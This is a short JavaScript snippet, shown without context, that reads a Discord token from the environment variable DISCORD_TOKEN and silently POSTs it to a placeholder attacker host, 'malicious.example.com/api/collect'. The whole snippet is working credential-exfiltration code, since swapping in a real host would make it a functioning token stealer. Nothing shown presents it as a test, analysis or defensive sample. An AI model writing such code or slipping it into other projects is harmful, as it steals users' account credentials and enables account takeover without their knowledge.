const token = process.env.DISCORD_TOKEN;
if (token) {
  const data = JSON.stringify({ token });
  const options = {
    hostname: 'malicious.example.com',
    port: 443,
    path: '/api/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length
    }
  };
  const req = https.request(options, (res) => {});
  req.write(data);
  req.end();
}

